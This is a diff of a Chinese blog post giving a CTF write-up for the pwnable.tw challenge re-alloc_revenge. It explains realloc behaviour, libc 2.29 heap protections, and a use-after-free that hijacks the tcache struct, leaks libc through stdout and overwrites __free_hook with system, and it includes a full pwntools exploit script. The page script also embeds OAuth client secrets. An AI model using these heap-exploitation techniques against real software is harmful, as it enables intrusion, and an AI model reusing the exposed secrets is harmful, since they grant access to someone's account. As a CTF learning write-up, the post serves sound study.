@@ -87,13 +87,16 @@
 <meta property="og:site_name" content="sh1ner&#39;s blog">
 <meta property="og:description" content="一道pwnable.tw新上的题，环境是libc2.29，在另一道题re-alloc的基础上开启了PIE和RELRO，可以通过这道题学习一些libc2.29、realloc的相关特性">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/images/3.png">
+<meta property="og:image" content="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/images/4.png">
+<meta property="og:image" content="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/images/5.png">
 <meta property="og:image" content="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/images/1.png">
 <meta property="og:image" content="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/images/2.png">
-<meta property="og:updated_time" content="2020-02-05T14:03:05.203Z">
+<meta property="og:updated_time" content="2020-02-21T11:10:20.646Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwnable.tw re-alloc_revenge">
 <meta name="twitter:description" content="一道pwnable.tw新上的题，环境是libc2.29，在另一道题re-alloc的基础上开启了PIE和RELRO，可以通过这道题学习一些libc2.29、realloc的相关特性">
-<meta name="twitter:image" content="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/images/1.png">
+<meta name="twitter:image" content="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/images/3.png">
 
 
 
@@ -321,16 +324,6 @@
 
           
             
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2020/02/05/pwnable-tw-re-alloc-revenge/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count gitment-comments-count" data-xid="/2020/02/05/pwnable-tw-re-alloc-revenge/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
           
 
           
@@ -357,12 +350,18 @@
       
         <p>一道pwnable.tw新上的题，环境是libc2.29，在另一道题re-alloc的基础上开启了PIE和RELRO，可以通过这道题学习一些libc2.29、realloc的相关特性</p>
 <a id="more"></a>
-<h2 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h2><p>程序主要有三个功能，malloc申请内存保存数据、realloc重新分配内存以及free释放内存，<br>堆指针由一个全局数组保存，而三种操作中都限制了数组范围只有两个，且free后将数组指针清0，此外，程序还限制了申请空间的大小不大于0x78</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这道题主要利用了当realloc的size参数为0时可以将指针free掉，且没有将指针清0从而导致UAF，但难点在于程序环境为libc2.29且全局数组只能保存两个指针，并且程序不能申请大于0x78的空间（加大了泄露libc的难度）</p>
+<h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><p>程序主要有三个功能，malloc申请内存保存数据、realloc重新分配内存以及free释放内存，<br>堆指针由一个全局数组保存，而三种操作中都限制了数组范围只有两个，且free后将数组指针清0，此外，程序还限制了申请空间的大小不大于0x78</p>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h2><p>realloc函数在头文件<code>&lt;stdlib.h&gt;</code>中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *realloc(void *ptr,size_t new_size);</span><br></pre></td></tr></table></figure>
+
+<p>ptr是将要进行重新分配的内存空间指针（必须在堆中），new_size是想要分配空间的大小<br>realloc主要特性：<br>1.对ptr进行判断，如果ptr为NULL，则相当于malloc(new_size)<br>2.如果ptr不为NULL，会查看ptr是否指向堆上的空间，如果不是会给出异常错误realloc invalid pointer；如果ptr在堆中，则查看new_size的大小，如果new_size为0，相当于free(ptr)，返回NULL；如果new_size小于原空间大小（后面记为old_size)，则ptr中的数据可能会丢失；<br>如果new_size&gt;old_size，会查看ptr指向的空间后面还有没有足够大小的连续空间，如果有的话，继续分配更多的空间，如果没有则将free(ptr)，然后malloc(new_size)，并将内容拷贝到新内存；如果new_size==old_size，则相当于没做什么。<br>以上为网上和结合本人实际应用的大概总结，不过在对于new_size&gt;old_size时其实有些模棱两可，通过这道题我的发现，如果当new_size&lt;old_size，会有可能进行free(ptr+new_size)。<br>如图，一个old_size=0x250的空间：<br><img src="images/3.png" alt><br>我们将原size为0x250的空间重新分配为0x30的空间，跟踪进入realloc，首先会改写ptr+new_size的内容，使其拥有chunk head：<br><img src="images/4.png" alt><br>继续调试跟踪，发现调用了free将新的空间释放：<br><img src="images/5.png" alt></p>
+<h2 id="libc-2-29"><a href="#libc-2-29" class="headerlink" title="libc-2.29"></a>libc-2.29</h2><p>在libc-2.29中加入了很多新的防护机制，主要参考自EX师傅的文章：<br><a href="http://blog.eonew.cn/archives/1167" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1167</a><br>总结一下：<br>1.tcache double free难以利用<br>2.增加了对prev_size的检测，会判断prev_size与要合并的chunk的size是否相等<br>3.unsorted bin attack难以利用<br>4.无法进行house of force<br>此外应该还有其他的机制，今后会继续研究</p>
+<p>限于（咸鱼）笔者水平太差，做过的2.29版本的pwn题不是很多，遇到的主要利用办法有：<br>1.通过多次malloc和free将同一chunk分别进入tcache和fastbins，造成“double free”<br>2.通过修改tcache struct（tcache虽然被限制了，但是还是一个很好的利用方向）<br>3.可以利用largebin attack代替unsortedbin attack</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>这道题主要利用了当realloc的size参数为0时可以将指针free掉，且没有将指针清0从而导致UAF，但难点在于程序环境为libc2.29且全局数组只能保存两个指针，并且程序不能申请大于0x78的空间（加大了泄露libc的难度）</p>
 <h2 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h2><p>libc-2.29版本存在tcache首先会在heap开头位置创建一个tcache结构体来维护：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];//0x40</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];//0x40*8</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
 
-<p>其前0x40字节为对应大小tcache的数量，后0x200个字节为指针数组，指向tcache_entry链表的头部指针，针对tcache结构体的利用参考：<a href="https://xz.aliyun.com/t/6828" target="_blank" rel="noopener">https://xz.aliyun.com/t/6828</a><br>这样我们可以利用uaf申请空间到tcahce sturct（需要爆破一字节），然后将tcache的数量改为不合法数组，从而使得tcache不可用，这样free后的chunk就不会进入tcache：<br><img src="images/1.png" alt><br>然后再利用realloc的特性，重新分配tcache struct这部分空间，可以将释放原空间（进入unsorted bin)并重新申请一段空间，只要控制好重新分配空间的大小，就足以将unsorted bin链表头写入tcahce指针数组对应的位置：<br><img src="images/2.png" alt><br>这样如果我们再次申请空间（注意有些size不可用）就会从unsorted bin中申请恰好可以利用unsorted bin链表头对于libc的偏移量，爆破一字节使得tcache指针指向_IO_2_1_stdout_的位置，这样我们就可以修改其结构体内容从而泄露libc基址</p>
+<p>其前0x40字节为对应大小tcache的数量，后0x200个字节为指针数组，指向tcache_entry链表的头部指针，针对tcache结构体的利用参考：<a href="https://xz.aliyun.com/t/6828" target="_blank" rel="noopener">https://xz.aliyun.com/t/6828</a><br>这样我们可以利用uaf申请空间到tcahce sturct（需要爆破一字节），然后将tcache的数量改为大于7的数字（由于是无符号比较，-1即可），从而使得tcache不可用，这样free后的chunk就不会进入tcache：<br><img src="images/1.png" alt><br>然后再利用realloc的特性，重新分配tcache struct这部分空间，可以将多余大小的空间释放掉，使其进入unsorted bin，如果控制好重新分配空间的大小，就足以将unsorted bin链表头写入tcahce指针数组对应的位置：<br><img src="images/2.png" alt><br>这样如果我们再次申请空间（注意有些size不可用）就会从unsorted bin中申请，恰好可以利用unsorted bin链表头对于libc的偏移量，爆破一字节使得tcache指针指向_IO_2_1_stdout_的位置，这样我们就可以修改其结构体内容从而泄露libc基址</p>
 <h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>由于我们已经劫持了tcache struct接下来的事情就顺理成章，修改指针指向free_hook将其修改为system然后就可以执行system(“/bin/sh”)来getshell了</p>
 <p>完整exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">prog = <span class="string">'./re-alloc_revenge'</span></span><br><span class="line">elf = ELF(prog)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"libc.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#if b == '':</span></span><br><span class="line">    <span class="comment">#	p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(idx, size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">	p.sendafter(<span class="string">"Data:"</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span><span class="params">(idx, size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">	<span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">		p.sendafter(<span class="string">"Data:"</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">global</span> p</span><br><span class="line">		<span class="comment">#p = process(prog)</span></span><br><span class="line">		p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10310</span>)</span><br><span class="line">		alloc(<span class="number">0</span>, <span class="number">0x40</span>)</span><br><span class="line">		alloc(<span class="number">1</span>, <span class="number">0x40</span>)</span><br><span class="line">		free(<span class="number">0</span>)</span><br><span class="line">		realloc(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">		realloc(<span class="number">1</span>, <span class="number">0x40</span> ,<span class="string">'\x10\x60'</span>)</span><br><span class="line">	</span><br><span class="line">		alloc(<span class="number">0</span>, <span class="number">0x40</span>)</span><br><span class="line">		realloc(<span class="number">0</span>, <span class="number">0x50</span>)</span><br><span class="line">		free(<span class="number">0</span>)</span><br><span class="line">		alloc(<span class="number">0</span>, <span class="number">0x40</span>, <span class="string">'\xff'</span>*<span class="number">4</span>+<span class="string">'\x00'</span>*<span class="number">2</span>+<span class="string">'\xff'</span>*(<span class="number">0x40</span><span class="number">-6</span>))</span><br><span class="line">		realloc(<span class="number">0</span>, <span class="number">0x50</span>)</span><br><span class="line">		realloc(<span class="number">1</span>, <span class="number">0x70</span>)</span><br><span class="line">		free(<span class="number">1</span>)</span><br><span class="line">		alloc(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">		free(<span class="number">0</span>)</span><br><span class="line">		realloc(<span class="number">1</span>, <span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">8</span>+<span class="string">'\x58\x47'</span>)</span><br><span class="line">		alloc(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">'/bin/sh\x00'</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">		p.recv(<span class="number">8</span>)</span><br><span class="line">		libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>)<span class="number">-0x7ffff7fc7570</span>+<span class="number">0x7ffff7de0000</span></span><br><span class="line">		log.info(<span class="string">"libc.address ==&gt; "</span> + hex(libc.address))</span><br><span class="line">		<span class="keyword">if</span> libc.address &amp; <span class="number">0xff</span> != <span class="number">0</span>:</span><br><span class="line">					p.close()</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">		realloc(<span class="number">1</span>, <span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">8</span>+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">		free(<span class="number">1</span>)</span><br><span class="line">		alloc(<span class="number">1</span>, <span class="number">0x60</span>, p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">		free(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">while</span> <span class="keyword">not</span> exp():</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
@@ -408,6 +407,10 @@
 
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/2020/02/14/linux-kernel-1/" rel="prev" title="linux kernel学习（一）">
+                linux kernel学习（一） <i class="fa fa-chevron-right"></i>
+              </a>
+            
           </div>
         </div>
       
@@ -436,14 +439,11 @@
           
 
   
-    <div class="comments" id="comments">
-      
-        <div id="gitment-container"></div>
-      
-    </div>
+  <div id="gitalk-container">
+  </div>
 
   
-
+  
 
 
         </div>
@@ -490,7 +490,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -514,6 +514,22 @@
           
 
           
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sh1ner" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ftrcjq@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
 
           
           
@@ -536,7 +552,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析程序"><span class="nav-number">1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#泄露libc基址"><span class="nav-number">3.</span> <span class="nav-text">泄露libc基址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">4.</span> <span class="nav-text">getshell</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#分析程序"><span class="nav-number">1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前置知识"><span class="nav-number">2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#realloc"><span class="nav-number">2.1.</span> <span class="nav-text">realloc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#libc-2-29"><span class="nav-number">2.2.</span> <span class="nav-text">libc-2.29</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#泄露libc基址"><span class="nav-number">3.1.</span> <span class="nav-text">泄露libc基址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">3.2.</span> <span class="nav-text">getshell</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -722,48 +738,27 @@
 
 
 
-<!-- LOCAL: You can save these files to your site and update links -->
-    
-        
-        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
-        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
-    
-<!-- END LOCAL -->
-
-    
-
-    
-      <script type="text/javascript">
-      function renderGitment(){
-        var gitment = new Gitmint({
-            id: window.location.pathname, 
-            owner: 'sh1ner',
-            repo: 'sh1ner.github.io',
-            
-            lang: "zh-Hans" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
-            
-            oauth: {
-            
-            
-                client_secret: 'f5a4082d40278cf25dc26a840dc4058567422a95',
-            
-                client_id: 'b3335fd38a0e6106f724'
-            }});
-        gitment.render('gitment-container');
-      }
-
-      
-      renderGitment();
-      
-      </script>
-    
 
 
 
 
 
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '3e46d70ce27cadc03165',
+          clientSecret: 'b49765fcc4d70e6af647ded4fd819972903ad727',
+          repo: 'sh1ner.github.io',
+          owner: 'sh1ner',
+          admin: ['sh1ner'],
+          id: location.pathname,
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
 
-
+.gt-container a{border-bottom: none;}
   
 
   <script type="text/javascript">
